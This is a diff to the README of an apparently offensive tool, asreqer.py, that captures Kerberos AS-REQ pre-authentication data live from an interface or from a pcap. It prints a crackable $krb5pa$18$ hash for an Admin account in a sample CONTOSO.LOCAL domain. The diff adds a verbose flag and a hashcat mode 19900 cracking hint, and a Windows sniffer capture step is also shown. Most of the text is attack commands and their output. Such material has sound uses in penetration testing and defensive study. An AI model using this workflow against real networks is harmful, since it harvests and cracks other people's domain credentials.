@@ -2,7 +2,7 @@
 asreq roasting
 
 ```sh
-python3 asreqer.py live tun0
+python3 asreqer.py --verbose live tun0
 [*] Starting live capture on interface: tun0
 [+] Found AS-REQ with pA-ENC-TIMESTAMP
     User (cname): Admin
@@ -14,6 +14,7 @@ python3 asreqer.py live tun0
 $krb5pa$18$Admin$CONTOSO.LOCAL$f4073aa7ba175[... snip... ]b99f44ec9
 => Admin@CONTOSO.LOCAL-f4073a.krb5pa
 =========================
+[!] hashcat -m 19900 ...  # AES256-CTS-HMAC-SHA1-96
 ```
 
 crack with:
@@ -34,7 +35,7 @@ PS C:\Users\Admin\Desktop> .\sniffer.exe "Ethernet" 10 capture.pcap
 and parse with:
 
 ```sh
-python3 asreqer.py file ../capture.pcap 
+python3 asreqer.py file --verbose ../capture.pcap 
 [*] Reading Kerberos packets from file: ../capture.pcap
 [+] Found AS-REQ with pA-ENC-TIMESTAMP
     User (cname): Admin
@@ -46,6 +47,7 @@ python3 asreqer.py file ../capture.pcap
 $krb5pa$18$Admin$CONTOSO.LOCAL$f4073aa7ba175[... snip... ]b99f44ec9
 => Admin@CONTOSO.LOCAL-f4073a.krb5pa
 =========================
+[!] hashcat -m 19900 ...  # AES256-CTS-HMAC-SHA1-96
 ```
 
 ## ref
